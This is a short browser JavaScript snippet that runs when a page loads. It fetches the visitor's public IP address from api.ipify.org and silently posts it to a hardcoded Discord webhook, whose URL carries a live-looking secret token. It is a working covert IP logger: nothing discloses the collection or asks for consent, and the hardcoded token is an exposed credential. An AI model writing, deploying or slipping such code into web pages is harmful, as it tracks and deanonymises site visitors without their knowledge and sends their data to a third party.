document.addEventListener('DOMContentLoaded', (event) => {
  fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
          const ip = data.ip;
          const content = "```MaxTac :: " + ip + "```";
          const webhookURL = 'https://discord.com/api/webhooks/1185482566694862919/MJSdMZnTnAVKeGUQxZjFVxypSWV5pqt0GuuBkH3-ST-EfyZ6DYa4ABDUSgKEjHhqVVZL';

          fetch(webhookURL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ content: content })
          });
      })
      .catch(error => console.error('Error:', error));
});